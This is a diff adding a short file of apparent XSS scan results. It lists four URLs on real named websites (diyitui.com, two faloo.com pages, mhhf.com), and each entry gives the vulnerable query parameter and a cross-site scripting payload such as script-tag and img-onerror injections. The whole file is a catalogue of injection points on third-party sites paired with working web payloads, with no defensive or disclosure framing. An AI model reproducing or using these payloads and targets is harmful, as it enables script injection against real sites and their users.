@@ -1,0 +1,20 @@
+检测网址 : https://www.diyitui.com/search?q=</script>"><script>prompt(1)</script>mayer
+提交方式 : GET
+漏洞参数 : q
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://u.faloo.com/Regist/Login.aspx?t=2&BackUrl=</script>"><script>prompt(1)</script>
+提交方式 : GET
+漏洞参数 : BackUrl
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://mm.faloo.com/girl/0/1.html?k="><img src=x onerror=prompt(1)>%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E&t=2
+提交方式 : POST
+漏洞参数 : k
+攻击载荷 : "><img src=x onerror=prompt(1)>
+------------------------------------
+检测网址 : http://www.mhhf.com/find.php?k= and 1=2 <script>alert(1)</script>+and+1%3D2+%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+提交方式 : POST
+漏洞参数 : k
+攻击载荷 :  and 1=2 <script>alert(1)</script>
+------------------------------------
